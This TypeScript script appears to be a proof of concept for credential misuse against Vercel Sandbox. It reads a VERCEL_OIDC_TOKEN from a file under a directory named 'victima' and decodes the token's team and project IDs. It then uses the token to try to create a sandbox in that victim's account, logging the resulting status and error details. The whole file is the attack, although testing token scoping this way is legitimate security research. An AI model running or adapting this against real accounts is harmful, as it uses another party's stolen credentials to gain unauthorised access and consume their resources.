import { Sandbox } from "@vercel/sandbox";
import { readFileSync } from "fs";
function loadEnv(file: string): Record<string, string> {
  const out: Record<string, string> = {};
  for (const line of readFileSync(file, "utf8").split("\n")) {
    const m = line.match(/^([A-Z_]+)=(.*)$/);
    if (m) out[m[1]] = m[2].trim();
  }
  return out;
}
const VICTIM = loadEnv("/tmp/vercel-sandbox/victima/.env.local").VERCEL_OIDC_TOKEN!;
const V = JSON.parse(Buffer.from(VICTIM.split(".")[1], "base64url").toString());
async function main() {
  const creds = { token: VICTIM, teamId: V.owner_id, projectId: V.project_id };
  try {
    const sbx = await Sandbox.create({ ...creds, template: "ubuntu" });
    console.log("OK created:", sbx.id);
    await sbx.stop();
  } catch (e: any) {
    console.log("create err:", e.message);
    if (e.response) { console.log("status:", e.response.status); console.log("body:", JSON.stringify(e.response.data ?? e.response.body).slice(0,500)); }
    console.log("causa:", e.cause?.message ?? e.cause);
  }
}
main().catch((e) => { console.error("ERR", e.message); process.exit(1); });
